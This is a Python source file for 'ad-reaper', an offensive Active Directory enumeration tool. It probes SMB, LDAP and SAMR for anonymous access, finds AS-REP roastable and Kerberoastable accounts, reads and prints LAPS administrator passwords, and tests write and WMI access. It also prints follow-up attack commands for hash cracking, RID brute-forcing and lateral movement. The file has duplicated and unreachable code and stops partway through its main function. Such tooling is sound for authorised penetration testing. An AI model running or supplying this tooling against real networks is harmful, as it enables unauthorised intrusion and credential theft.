#!/usr/bin/env python3

"""
ad-reaper.py: A comprehensive Active Directory enumeration tool.

This tool combines anonymous (null session) and authenticated enumeration techniques
to provide a broad overview of an Active Directory environment's security posture.

Default Mode (Anonymous):
Performs quick, multi-protocol enumeration targeting low-hanging fruit like
anonymous null sessions. It combines LDAP, SAMR, and SMB enumeration with
active vulnerability testing..

Authenticated Mode:
Leverages credentials to perform a deep-dive enumeration. It checks for accessible shares,
remote access pathways, and common AD misconfigurations.
"""

import sys
import argparse
import ipaddress
import socket

from impacket.dcerpc.v5 import samr, transport, dcomrt
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.ndr import NULL
from impacket.dcerpc.v5.samr import DCERPCException
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import Principal
from impacket.nmb import NetBIOSError
from impacket.smb3 import FILE_ATTRIBUTE_DIRECTORY
from impacket.smbconnection import SMBConnection, SessionError
from impacket.nt_errors import STATUS_LOGON_FAILURE, STATUS_ACCESS_DENIED, STATUS_USER_SESSION_DELETED
from ldap3 import Server, Connection, ANONYMOUS, NTLM, SUBTREE, BASE, ALL, ALL_ATTRIBUTES
from ldap3.core.exceptions import LDAPInvalidCredentialsResult, LDAPSocketOpenError

# ANSI color codes for console output.
class Style:
    """ANSI color codes for console output."""
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'

# Helper functions for standardized console output.
def print_info(message): print(f"[*] {message}")
def print_success(message): print(f"[+] {Style.GREEN}{message}{Style.RESET}")
def print_vulnerable(message): print(f"[+] {Style.RED}{message}{Style.RESET}")
def print_error(message): print(f"[!] {Style.YELLOW}{message}{Style.RESET}")
def print_fail(message): print(f"[-] {Style.RED}{message}{Style.RESET}")
def print_secure(message): print(f"[-] {Style.GREEN}{message}{Style.RESET}")
def print_section_header(title):
    """Prints a standardized, centered section header."""
    print("\n" + "=" * 60)
    print(f" {title.upper()} ".center(60, "="))
    print("=" * 60 + "\n")


# --- Anonymous/Null Session Functions ---

def check_smb_null_session(target_ip):
    """
    Checks for an SMB null session, lists shares, and enumerates files.
    Returns True if any potentially sensitive files are found, otherwise False.
    """
    found_sensitive_file = False
    SHARES_TO_SKIP = ('IPC$', 'PRINT$')
    SENSITIVE_EXTS = ('.xml', '.txt', '.ini', '.config', '.kdbx', '.toml')

    def list_smb_path(conn, share, path):
        nonlocal found_sensitive_file
        r"""
        Recursively lists files and directories in a given path.
        'path' should be a directory, e.g., r'\' or r'\dir1\'
        """
        query_path = f"{path}*"
        try:
            files = conn.listPath(share, query_path)
            for f in files:
                filename = f.get_longname()
                is_dir = f.get_attributes() & FILE_ATTRIBUTE_DIRECTORY
                full_print_path = f"{path}{filename}"

                if filename in ('.', '..'):
                    continue

                if is_dir:
                    print(f"  > {Style.CYAN}{full_print_path}/{Style.RESET}")
                    list_smb_path(conn, share, f"{path}{filename}\\")
                else:
                    if filename.lower().endswith(SENSITIVE_EXTS) or 'password' in filename.lower():
                        print_vulnerable(f"  > {full_print_path}  (SENSITIVE FILE)")
                        found_sensitive_file = True
                    else:
                        print(f"  > {full_print_path}")
        except SessionError as e:
            if e.getErrorCode() == STATUS_ACCESS_DENIED:
                print_error(f"  > {query_path} (Access Denied)")
            else:
                print_error(f"  > Error listing {query_path}: {e}")

    print_info("Checking for anonymous SMB login and share listing (port 445)...")
    for user in ['', '.']:
        conn = None
        try:
            conn = SMBConnection(target_ip, target_ip, timeout=5)
            conn.login(user, '')
            print_success(f"SUCCESS: Anonymous SMB login (user: '{user}') is ALLOWED!")

            shares = conn.listShares()
            print_info("Enumerating accessible shares...")

            for share in shares:
                share_name = share['shi1_netname'][:-1]
                if share_name in SHARES_TO_SKIP:
                    continue

                print(f"\n--- Scanning Share: {Style.CYAN}{share_name}{Style.RESET} ---")
                list_smb_path(conn, share_name, "\\")

            return found_sensitive_file

        except SessionError as e:
            if e.getErrorCode() == STATUS_ACCESS_DENIED:
                print_error(f"Login with user '{user}' OK, but share listing is DENIED. Trying next user...")
            elif e.getErrorCode() == STATUS_LOGON_FAILURE:
                pass
            else:
                print_error(f"SMB Error with user '{user}': {e}")
                break
        except (ConnectionRefusedError, NetBIOSError):
            print_error(f"Error connecting to SMB on {target_ip} (Connection refused or host not found)")
            return found_sensitive_file
        except Exception as e:
            print_error(f"An unexpected error occurred with SMB on {target_ip}: {e}")
            return found_sensitive_file
        finally:
            if conn:
                try:
                    conn.logoff()
                except SessionError as e:
                    # Ignore error if the session was already deleted by the server
                    if e.getErrorCode() != STATUS_USER_SESSION_DELETED:
                        raise

    print_fail("FAILED: Anonymous SMB login is NOT allowed or no user could list shares.")
    return found_sensitive_file

def query_ldap_anonymous(target_ip):
    """
    Checks for anonymous LDAP bind and queries for domain info, active users,
    SPNs, and server objects.
    Returns domain_dn, a list of users, and a list of SPNs.
    """
    print_info("Checking for anonymous LDAP bind (port 389)...")
    server = Server(target_ip, get_info=ALL_ATTRIBUTES)
    conn = None
    domain_dn = None
    user_list = []
    spn_list = []
    
    try:
        conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)
        print_success("SUCCESS: Anonymous LDAP bind is ALLOWED!")
        print_info("Querying Domain Controller information...")

        try:
            domain_attrs = [
                'defaultNamingContext', 'dnsHostName', 'serverName',
                'domainControllerFunctionality', 'forestFunctionality',
                'domainFunctionality', 'namingContexts'
            ]
            conn.search(search_base='', search_filter='(objectClass=*)', search_scope=BASE, attributes=domain_attrs)

            if not conn.entries:
                print_error("Could not retrieve domain info from RootDSE.")
                return None, [], []

            domain_info = conn.entries[0]

            if 'defaultNamingContext' in domain_info:
                domain_dn = domain_info.defaultNamingContext.value
                print(f"  - {Style.CYAN}Domain DN:{Style.RESET} {domain_dn}")
            else:
                print_error("Could not retrieve defaultNamingContext. Aborting LDAP enum.")
                return None, [], []

            for attr in domain_attrs:
                if attr == 'defaultNamingContext':
                    continue
                if attr in domain_info:
                    value = domain_info[attr].value
                    attr_formatted = ' '.join(word.capitalize() for word in attr.replace('Functionality', ' Func Level').split())
                    if isinstance(value, list):
                        print(f"  - {Style.CYAN}{attr_formatted}:{Style.RESET}")
                        for item in value:
                            print(f"    - {item}")
                    else:
                        print(f"  - {Style.CYAN}{attr_formatted}:{Style.RESET} {value}")
            
            print_info("Querying for active, non-system user accounts...")
            real_users_filter = '(& (objectClass=person) (!(objectClass=computer)) (!(userAccountControl:1.2.840.113556.1.4.803:=2)) (!(sAMAccountName=HealthMailbox*)))'
            real_users_filter = f'(& (objectClass=person) (!(objectClass=computer)) (!(userAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE})) (!(sAMAccountName=HealthMailbox*)))'
            conn.search(search_base=domain_dn, search_filter=real_users_filter, search_scope=SUBTREE, attributes=['sAMAccountName', 'description'], size_limit=0)

            if conn.entries:
                print_success("Found active users via LDAP:")
                print(f"{Style.YELLOW}{'Username':<25} {'Description'}{Style.RESET}")
                print(f"{'-'*25} {'-'*40}")
                for entry in conn.entries:
                    username = entry.sAMAccountName.value
                    desc = entry.description.value or 'N/A'
                    if username:
                        user_list.append(username)
                        print(f"{Style.YELLOW}{username:<25}{Style.RESET} {desc}")

            print_info("Querying for users with Service Principal Names (SPNs)...")
            spn_filter = '(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))'
            conn.search(search_base=domain_dn, search_filter=spn_filter, search_scope=SUBTREE, attributes=['sAMAccountName', 'servicePrincipalName'], size_limit=0)

            if conn.entries:
                print_vulnerable("Found users with SPNs (Potential Kerberoast Targets):")
                for entry in conn.entries:
                    username = entry.sAMAccountName.value
                    spns = entry.servicePrincipalName.value
                    spn_display = spns[0] if isinstance(spns, list) else spns
                    spn_list.append(spn_display)
                    print(f"  > {Style.RED}{username:<25}{Style.RESET} SPN: {spn_display}...")
            else:
                print_secure("No users with SPNs found via anonymous LDAP.")

            print_info("Querying for high-value Server objects...")
            server_filter = '(&(objectClass=computer)(operatingSystem=*Server*))'
            conn.search(search_base=domain_dn, search_filter=server_filter, search_scope=SUBTREE, attributes=['sAMAccountName', 'operatingSystem', 'dNSHostName'], size_limit=0)

            if conn.entries:
                print_success("Found Server Objects:")
                for entry in conn.entries:
                    name = entry.sAMAccountName.value
                    os = entry.operatingSystem.value or 'N/A'
                    dns = entry.dNSHostName.value or 'N/A'
                    print(f"  > {Style.CYAN}{name:<20}{Style.RESET} OS: {os} ({dns})")
            else:
                print_info("No Server objects found via anonymous LDAP.")

            return domain_dn, user_list, spn_list 

        except Exception as e:
            print_error(f"Error during LDAP enumeration: {e}")
            return domain_dn, user_list, spn_list 

    except LDAPInvalidCredentialsResult:
        print_fail("FAILED: Anonymous LDAP bind is NOT allowed.")
    except (ConnectionRefusedError, LDAPSocketOpenError):
        print_error(f"Error connecting to LDAP on {target_ip} (Connection refused)")
    except Exception as e:
        print_error(f"An unexpected error occurred with LDAP on {target_ip}: {e}")
    finally:
        if conn:
            conn.unbind()

    return domain_dn, user_list, spn_list 

def enumerate_users_samr(target_ip):
    """
    Enumerates non-junk domain users via the SAMR RPC interface.
    """
    print_info("Enumerating all domain users via SAMR...")
    for user in ['', '.']:
        try:
            string_binding = r'ncacn_np:%s[\pipe\samr]' % target_ip
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.set_dport(445)
            rpc_transport.set_credentials(user, '')
            rpc_transport.set_connect_timeout(5.0)

            print_info(f"Attempting SAMR enum with user: '{user}'")
            rpc_transport.connect()
            dce = rpc_transport.get_dce_rpc()
            dce.bind(samr.MSRPC_UUID_SAMR)

            resp = samr.hSamrConnect(dce, serverName=f'\\\\{target_ip}', desiredAccess=samr.MAXIMUM_ALLOWED)
            server_handle = resp['ServerHandle']

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
            domain_name = next((d['Name'] for d in resp['Buffer']['Buffer'] if d['Name'] != 'Builtin'), None)

            if not domain_name:
                print_error("Could not find a non-Builtin domain via SAMR.")
                dce.disconnect()
                continue

            resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain_name)
            domain_sid = resp['DomainId']
            resp = samr.hSamrOpenDomain(dce, server_handle, desiredAccess=samr.MAXIMUM_ALLOWED, domainId=domain_sid)
            domain_handle = resp['DomainHandle']

            resp = samr.hSamrEnumerateUsersInDomain(dce, domain_handle)
            
            user_list = []
            JUNK_PREFIXES = ('$', 'SM_', 'HealthMailbox', 'DefaultAccount', 'Guest', 'Administrator', 'krbtgt')
            
            for user_info in resp['Buffer']['Buffer']:
                username = user_info['Name']
                rid = user_info['RelativeId']
                if not any(username.startswith(p) for p in JUNK_PREFIXES):
                    user_list.append((username, rid))

            dce.disconnect()
            print_success(f"SUCCESS: SAMR enumeration with user '{user}' is ALLOWED!")
            print_success(f"Found {len(user_list)} non-junk users via SAMR:")
            if user_list:
                for username, rid in user_list:
                    print(f"{Style.YELLOW}{username:<25}{Style.RESET} (RID: {hex(rid)})")
                # Return only the usernames for the master list
                return [u for u, r in user_list]

        except (DCERPCException, SessionError) as e:
            if 'STATUS_ACCESS_DENIED' in str(e):
                print_error(f"Login with user '{user}' OK, but SAMR access is DENIED.")
                continue
            elif e.getErrorCode() != STATUS_LOGON_FAILURE:
                print_error(f"SMB Error during SAMR enum: {e}")
                return []
        except (ConnectionRefusedError, NetBIOSError):
            print_error(f"Error connecting to RPC/SAMR on {target_ip}")
            return []
        except Exception as e:
            print_error(f"An unexpected error occurred with SAMR enumeration: {e}")
            return []

    print_fail("FAILED: Anonymous SAMR enumeration is NOT allowed.")
    return []

def check_asrep_roastable_users(target_ip, domain_dn, user_list):
    """
    Checks for the AS-REP Roasting vulnerability by attempting to get a TGT
    for each user without pre-authentication. Returns a list of vulnerable users.
    """
    # TODO: Get TGT and print to screen in hashcat format
    if not domain_dn or not user_list:
        print_info("Skipping AS-REP Roast check (missing domain or user list).")
        return []

    print_info("Checking for AS-REP Roastable users...")
    domain_name = domain_dn.replace("DC=", "").replace(",", ".")
    roastable_users = []

    for username in user_list:
        try:
            princ = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            getKerberosTGT(princ, '', domain_name, '', '', '', kdcHost=target_ip)
        except Exception as e:
            error_string = str(e)
            if "KDC_ERR_PREAUTH_REQUIRED" in error_string:
                pass  # Secure case
            elif "SessionKeyDecryptionError" in error_string or "ciphertext integrity failure" in error_string:
                print_vulnerable(f"VULNERABLE: User '{username}' is AS-REP Roastable!")
                roastable_users.append(username)
            elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in error_string:
                pass
            else:
                print_error(f"Kerberos error for '{username}': {e}")

    if not roastable_users:
        print_secure("No AS-REP roastable users found.")
    
    return roastable_users

    if not roastable_users:
        print_secure("No AS-REP roastable users found.")
    
    return roastable_users

def parse_hashes(hash_string):
    """Parses an LM:NT hash string."""
    try:
        lm_hash, nt_hash = hash_string.split(':')
        if len(lm_hash) == 32 and len(nt_hash) == 32:
            print_info("Using LM:NT hash format for authentication.")
            return lm_hash, nt_hash
    except ValueError:
        pass # Fall through to the error
    print_error("Invalid hash format. Expected LM:NT (e.g., 'aad3...:31d6...').")
    sys.exit(1)

def get_domain_from_ldap(target_ip):
    """
    Performs a quick anonymous LDAP query to get the domain name.
    Returns the NetBIOS domain name.
    """
    print_info(f"Attempting to discover domain name from {target_ip} via anonymous LDAP...")
    server = Server(target_ip, get_info=['defaultNamingContext'])
    conn = None
    try:
        conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)  # noqa: F841
        if server.info and server.info.other.get('defaultNamingContext'):
            domain_dn = server.info.other['defaultNamingContext'][0]
            netbios_name = domain_dn.split(',')[0].replace('DC=', '').upper()
            print_success(f"  -> Discovered domain: {netbios_name}")
            return netbios_name
    except (LDAPSocketOpenError, ConnectionRefusedError):
        print_error(f"  -> Could not connect to LDAP on {target_ip} to auto-discover domain.")
    except Exception:
        pass # Fail silently if anonymous bind is not allowed
    return None

# --- Authenticated Functions ---

def parse_identity(user_string):
    """Parses a user string in 'domain/user' or 'user' format."""
    if '/' in user_string:
        return user_string.split('/', 1)
    elif '\\' in user_string:
        return user_string.split('\\', 1)
    else:
        return '', user_string

def check_port(target_ip, port):
    """Simple socket check to see if a service is listening."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(2)
        try:
            s.connect((target_ip, port))
            return True
        except (socket.timeout, ConnectionRefusedError):
            return False

def enumerate_smb_shares_auth(target_ip, domain, username, password, lmhash, nthash):
    """Connects to SMB with credentials and lists accessible shares."""
    print_section_header("Authenticated SMB Share Enumeration")
    try:
        conn = SMBConnection(target_ip, target_ip, timeout=5)
        conn.login(username, password, domain, lmhash=lmhash, nthash=nthash)
        print_success(f"SMB Auth Successful as {domain}\\{username}")

        shares = conn.listShares()
        print(f"  {Style.CYAN}{'Share Name':<20} {'Comment'}{Style.RESET}")
        print(f"  {'-'*20} {'-'*30}")
        
        discovered_shares = [s['shi1_netname'][:-1] for s in shares]
        for share_name in discovered_shares:
            # Find the corresponding remark for printing
            remark = next((s['shi1_remark'][:-1] for s in shares if s['shi1_netname'][:-1] == share_name), "")
            print(f"  {share_name:<20} {remark}")

        # After listing, check for read/write access on all discovered shares.
        print_info("\n  Checking for read/write access on discovered shares...")
        SHARES_TO_SKIP_CHECKS = ('IPC$', 'PRINT$')
        for share_name in discovered_shares:
            if share_name in SHARES_TO_SKIP_CHECKS:
                continue

            access_summary = []
            # Test for READ access
            try:
                conn.listPath(share_name, '\\*')
                access_summary.append(f"{Style.GREEN}READ{Style.RESET}")
            except SessionError:
                access_summary.append(f"{Style.RED}NO READ{Style.RESET}")

            # Test for WRITE access
            try:
                # Attempt to create and immediately delete a temporary file.
                temp_file = 'ad-reaper-test.tmp'
                tid, fid = conn.createFile(share_name, temp_file)
                conn.closeFile(tid, fid)
                conn.deleteFile(share_name, temp_file)
                access_summary.append(f"{Style.RED}WRITE{Style.RESET}") # Write is always a high finding
            except SessionError:
                access_summary.append(f"{Style.RED}NO WRITE{Style.RESET}")
            
            print(f"    -> {share_name:<15} Access: [{', '.join(access_summary)}]")

        conn.logoff()
    except SessionError as e:
        if e.getErrorCode() == STATUS_LOGON_FAILURE:
            print_fail(f"SMB Login Failed: Invalid Credentials for {username}")
        else:
            print_fail(f"SMB Error: {e}")
    except Exception as e:
        print_fail(f"Connection Error: {e}")

def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash):
    """
    Performs a comprehensive, authenticated LDAP enumeration.
    Returns the domain's search_base, a list of the user's groups, and a
    dictionary of findings (SPNs, admin users).
    """
    print_section_header("Authenticated LDAP Enumeration")
    user_dn = f"{domain}\\{username}" if domain else username
    user_groups = []
    search_base = None
    findings = {'spns': [], 'admin_users': []}

    try:
        server = Server(target_ip, get_info=ALL)
        # ldap3's NTLM auth handler uses impacket, which can take the hash in the password field
        # if it's formatted correctly for NTLM.
        auth_password = f"{lmhash}:{nthash}" if lmhash and nthash else password
        conn = Connection(server, user=user_dn, password=auth_password, authentication=NTLM, auto_bind=True)
        print_success(f"LDAP Bind Successful as {user_dn}")

        if server.info and server.info.other.get('defaultNamingContext'):
            search_base = server.info.other['defaultNamingContext'][0]
            print_info(f"Target Domain: {search_base}")
        else:
            print_fail("Could not determine DefaultNamingContext.")
            return None, [], findings

        print_info(f"Querying groups for user '{username}'...")
        conn.search(search_base, f'(sAMAccountName={username})', attributes=['memberOf', 'primaryGroupID'])
        if conn.entries:
            entry = conn.entries[0]
            primary_group_id = entry.primaryGroupID.value if 'primaryGroupID' in entry else None

            if 'memberOf' in entry:
                print(f"  {Style.YELLOW}Group Memberships:{Style.RESET}")
                for group in entry.memberOf:
                    cn = str(group).split(',')[0].replace('CN=', '').lower()
                    print(f"    - {cn}")
                    user_groups.append(cn)
            
            if primary_group_id:
                conn.search(search_base, f'(primaryGroupToken={primary_group_id})', attributes=['sAMAccountName'])
                if conn.entries:
                    primary_group_name = conn.entries[0].sAMAccountName.value.lower()
                    if primary_group_name not in user_groups:
                         print(f"    - {primary_group_name} (Primary Group)")
                         user_groups.append(primary_group_name)

        print_info("Querying for active, non-system user accounts...")
        real_users_filter = '(& (objectClass=person) (!(objectClass=computer)) (!(userAccountControl:1.2.840.113556.1.4.803:=2)) (!(sAMAccountName=HealthMailbox*)))'
        real_users_filter = f'(& (objectClass=person) (!(objectClass=computer)) (!(userAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE})) (!(sAMAccountName=HealthMailbox*)))'
        conn.search(search_base, real_users_filter, search_scope=SUBTREE, attributes=['sAMAccountName', 'description'], size_limit=0)
        if conn.entries:
            print(f"{Style.YELLOW}{'Username':<25} {'Description'}{Style.RESET}")
            print(f"{'-'*25} {'-'*40}")
            for entry in conn.entries:
                u_name = entry.sAMAccountName.value
                desc = entry.description.value or 'N/A'
                if u_name:
                    print(f"{Style.YELLOW}{u_name:<25}{Style.RESET} {desc}")
        else:
            print_info("  No active users found with this filter.")

        print_info("Querying for high-value Server objects...")
        server_filter = '(&(objectClass=computer)(operatingSystem=*Server*))'
        conn.search(search_base, server_filter, search_scope=SUBTREE, attributes=['sAMAccountName', 'operatingSystem', 'dNSHostName'], size_limit=0)
        if conn.entries:
            print_success("  Found Server Objects:")
            for entry in conn.entries:
                name = entry.sAMAccountName.value
                os = entry.operatingSystem.value or 'N/A'
                dns = entry.dNSHostName.value or 'N/A'
                print(f"    > {Style.CYAN}{name:<20}{Style.RESET} OS: {os} ({dns})")
        else:
            print_info("  No Server objects found.")

        print_info("Scanning for Service Principal Names (SPNs)...")
        spn_filter = '(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))'
        conn.search(search_base, spn_filter, attributes=['sAMAccountName', 'servicePrincipalName'])
        if conn.entries:
            print_success("  Found user accounts with SPNs (Potential Kerberoast Targets):")
            for entry in conn.entries:
                u = entry.sAMAccountName.value
                spn_val = entry.servicePrincipalName.value
                if isinstance(spn_val, list):
                    spn_val = spn_val[0]
                
                # Differentiate between user and machine accounts for suggestions
                if not u.endswith('$'):
                    findings['spns'].append({'user': u, 'spn': spn_val})
                    print(f"    > {Style.YELLOW}{u:<20}{Style.RESET} (SPN: {spn_val})")
                else:
                    print(f"    > {Style.CYAN}{u:<20}{Style.RESET} (SPN: {spn_val}) [Machine Account]")
        else:
            print_secure("  No user accounts with SPNs found.")

        print_info("Querying for privileged accounts (adminCount=1)...")
        conn.search(search_base, '(&(objectClass=user)(adminCount=1))', attributes=['sAMAccountName'])
        if conn.entries:
            print_success("  -> Found accounts with adminCount=1 (High-Value Targets):")
            for entry in conn.entries:
                if 'sAMAccountName' in entry:
                    findings['admin_users'].append(entry.sAMAccountName.value)
                    print(f"    - {Style.YELLOW}{entry.sAMAccountName.value}{Style.RESET}")

        conn.unbind()
        return search_base, user_groups, findings

    except LDAPSocketOpenError:
        print_fail(f"Could not connect to LDAP port 389 on {target_ip}")
    except Exception as e:
        print_fail(f"LDAP Error: {e}")
    return None, [], findings

def find_ad_misconfigs_auth(target_ip, domain, username, password, lmhash, nthash, search_base):
    """
    Checks for common, high-impact misconfigurations via authenticated LDAP.
    Returns a dictionary of findings (unconstrained delegation, LAPS).
    """
    if not search_base:
        print_info("Skipping misconfiguration check (no search_base from LDAP).")
        return

    findings = {'unconstrained_delegation': [], 'laps_readable': []}
    print_section_header("AD Misconfiguration Check")
    user_dn = f"{domain}\\{username}" if domain else username
    try:
        server = Server(target_ip, get_info=ALL)
        auth_password = f"{lmhash}:{nthash}" if lmhash and nthash else password
        conn = Connection(server, user=user_dn, password=auth_password, authentication=NTLM, auto_bind=True)

        print_info("Checking for accounts with Unconstrained Delegation...")
        delegation_filter = '(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(samAccountType=805306369))'
        conn.search(search_base, delegation_filter, attributes=['sAMAccountName', 'objectClass'])
        if not conn.entries:
            print_secure("  -> No accounts with Unconstrained Delegation found.")
        else:
            for entry in conn.entries:
                obj_type = "Computer" if 'computer' in entry.objectClass else "User"
                print_success(f"  -> VULNERABLE: {entry.sAMAccountName.value} ({obj_type}) has Unconstrained Delegation!")
                findings['unconstrained_delegation'].append(entry.sAMAccountName.value)

        print_info("Checking for readable LAPS passwords...")
        conn.search(search_base, '(objectClass=computer)', attributes=['sAMAccountName', 'ms-Mcs-AdmPwd'])
        found_laps = False
        for entry in conn.entries:
            if 'ms-Mcs-AdmPwd' in entry and entry['ms-Mcs-AdmPwd'].value:
                print_vulnerable(f"  -> VULNERABLE: Can read LAPS password for {entry.sAMAccountName.value}: {entry['ms-Mcs-AdmPwd'].value}")
                found_laps = True
                findings['laps_readable'].append(entry.sAMAccountName.value)
        if not found_laps:
            print_secure("  -> No readable LAPS passwords found.")
        conn.unbind()
    except Exception as e:
        if 'invalid attribute type' in str(e):
            print_fail("  -> LAPS attribute 'ms-Mcs-AdmPwd' not found in schema.")
        else:
            print_error(f"Could not perform misconfiguration check. Error: {e}")
    return findings

def check_access_paths_auth(target_ip, user_groups, username, password, lmhash, nthash, domain):
    """Checks for RDP, WinRM, and WMI access with credentials."""
    print_section_header("Remote Access Check")

    # Port checks
    for port, name in [(5985, "WinRM"), (3389, "RDP"), (135, "WMI/RPC"), (1433, "MSSQL")]:
        status = f"{Style.GREEN}OPEN{Style.RESET}" if check_port(target_ip, port) else f"{Style.RED}CLOSED{Style.RESET}"
        print(f"  > {name} ({port}): {status}")

    # WMI Access Check
    if check_port(target_ip, 135):
        print_info("  -> Port 135 is open, attempting WMI authentication...")
        try:
            dcom = dcomrt.DCOMConnection(target_ip, username, password, domain, lmhash, nthash, oxidResolver=True)
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            print_success("  -> WMI Access is CONFIRMED (wmiexec.py should work)")
            iWbemLevel1Login.RemRelease()
            dcom.disconnect()
        except Exception as e:
            if "rpc_s_access_denied" in str(e).lower() or "access denied" in str(e).lower():
                print_error("  -> WMI Access DENIED (Creds rejected)")
            else:
                print_error(f"  -> WMI Auth check failed: {e}")

    # Group correlation
    flat_groups = [g.lower() for g in user_groups]
    if check_port(target_ip, 5985) and any(x in flat_groups for x in ['remote management users', 'administrators']):
        print_success("  -> WinRM Access LIKELY (Group Membership Match)")
    if check_port(target_ip, 3389) and any(x in flat_groups for x in ['remote desktop users', 'administrators']):
        print_success("  -> RDP Access LIKELY (Group Membership Match)")

# --- Post-Scan Suggestions ---

def print_suggestions(target_ip, findings, auth_creds=None):
    """Prints a list of suggested follow-up commands based on scan findings."""
    
    print_section_header("Actionable Suggestions")
    
    # Use a flag to check if any suggestions were printed
    suggestions_made = False

    # Check for ADCS SPNs first, as it's a high-impact finding
    adcs_spns_found = []
    if findings.get('spns'):
        # Handle both anonymous (list of strings) and authenticated (list of dicts) findings
        spn_list = [item['spn'] if isinstance(item, dict) else item for item in findings['spns']]
        for spn in spn_list:
            if spn.lower().startswith('adcs/'):
                adcs_spns_found.append(spn)

    if adcs_spns_found:
        print(f"{Style.YELLOW}[!] Active Directory Certificate Services (ADCS) SPN Found:{Style.RESET}")
        domain = findings.get('domain_name', '<DOMAIN.LOCAL>')
        ca_name = adcs_spns_found[0].split('/')[1].split('.')[0]
        print("  An SPN for ADCS was found. This indicates the presence of a Certificate Authority.")
        print("  You should enumerate it for misconfigurations (e.g., ESC1, ESC8) using Certipy.")
        print(f"  > {Style.CYAN}certipy find -u '<user>@<domain>' -p '<password>' -dc-ip {target_ip} -ca '{ca_name}'{Style.RESET}\n")
        suggestions_made = True

    if findings.get('asrep_users'):
        print_info("No specific vulnerabilities found to generate suggestions for.")
        print(f"{Style.YELLOW}[!] AS-REP Roastable Users Found:{Style.RESET}")
        domain = findings.get('domain_name', '<DOMAIN.LOCAL>')
        print("  The following users do not require Kerberos pre-authentication.")
        print("  You can attempt to get their password hashes for offline cracking.")
        print(f"  > {Style.CYAN}GetNPUsers.py {domain}/ -dc-ip {target_ip} -no-pass -usersfile ad_users.txt -outputfile asrep.hashes{Style.RESET}\n")
        suggestions_made = True

    if findings.get('spns') and auth_creds: # 'spns' now only contains user accounts
        print(f"{Style.YELLOW}[!] Kerberoastable SPNs Found:{Style.RESET}")
        domain, user = parse_identity(auth_creds['username'])
        target_domain = findings.get('domain_name', domain).upper()
        creds_part = f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{auth_creds['nthash']}' " if auth_creds.get('nthash') else ""
        print("  Service Principal Names (SPNs) associated with user accounts were found.")
        print("  You can attempt to request service tickets for them and crack the hashes offline.")
        print(f"  > {Style.CYAN}GetUserSPNs.py -dc-ip {target_ip} {creds_part}-request -outputfile tgs.hashes {target_domain}/{user}{Style.RESET}\n")
        suggestions_made = True

    if findings.get('unconstrained_delegation'):
        print(f"{Style.YELLOW}[!] Unconstrained Delegation Found:{Style.RESET}")
        print("  The following accounts can impersonate users on any service on their host.")
        print("  If you gain control of one, you can capture TGTs from incoming authentications (e.g., from Domain Admins).")
        print("  > Consider using tools like BloodHound to visualize attack paths or manually check for printer spooler abuse.\n")
        suggestions_made = True

    if findings.get('laps_readable'):
        print(f"{Style.YELLOW}[!] Readable LAPS Passwords Found:{Style.RESET}")
        print("  You have permissions to read local administrator passwords for some machines.")
        print("  > Use these credentials for lateral movement with tools like evil-winrm, psexec.py, or smbexec.py.\n")
        suggestions_made = True

    if findings.get('admin_users'):
        print(f"{Style.YELLOW}[!] Privileged Accounts (adminCount=1) Identified:{Style.RESET}")
        print("  These accounts are or were members of privileged groups.")
        print("  > They are high-value targets for credential theft and lateral movement.\n")
        suggestions_made = True

    if findings.get('no_users_found'):
        print(f"{Style.YELLOW}[!] No Users Found via Anonymous Enumeration:{Style.RESET}")
        # domain_name = findings.get('domain_name', 'TARGET-DC').split('.')[0].upper() 
        print("  Standard enumeration failed to find users. You can try to discover them")
        print("  by brute-forcing Relative IDs (RIDs).")
        print(f"  > {Style.CYAN}nxc smb {target_ip} -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users {Style.RESET}\n")
        suggestions_made = True

    if findings.get('sensitive_files_found'):
        print(f"{Style.YELLOW}[!] Sensitive Files Found on Anonymous SMB Share:{Style.RESET}")
        print("  Files with sensitive extensions (.xml, .config, etc.) were found.")
        print("  You should manually inspect them for credentials or configuration details.")
        print(f"  > {Style.CYAN}smbclient //{target_ip}/<SHARE> -U '' -N -c 'get <path/to/file>'{Style.RESET}\n")
        suggestions_made = True

    if not suggestions_made:
        print_info("No specific vulnerabilities found to generate suggestions for.")

# --- Main Execution Logic ---

def run_anonymous_scan(target_ip):
    """
    Executes all anonymous enumeration modules and returns a dictionary of findings.
    """
    findings = {}
    print_section_header("SMB Anonymous Enumeration")
    findings['sensitive_files_found'] = check_smb_null_session(target_ip)

    print_section_header("LDAP Anonymous Enumeration")
    findings['domain_dn'], ldap_users, findings['spns'] = query_ldap_anonymous(target_ip)
    if findings.get('domain_dn'):
        findings['domain_name'] = findings['domain_dn'].replace("DC=", "").replace(",", ".")

    print_section_header("SAMR Anonymous Enumeration")
    samr_users = enumerate_users_samr(target_ip)

    master_user_set = set(ldap_users) | set(samr_users)
    if master_user_set:
        with open("ad_users.txt", "w") as f:
            for user in sorted(list(master_user_set)):
                f.write(f"{user}\n")
        print_info("Full user list saved to ad_users.txt")
    else:
        findings['no_users_found'] = True

    print_section_header("AS-REP Roasting Check")
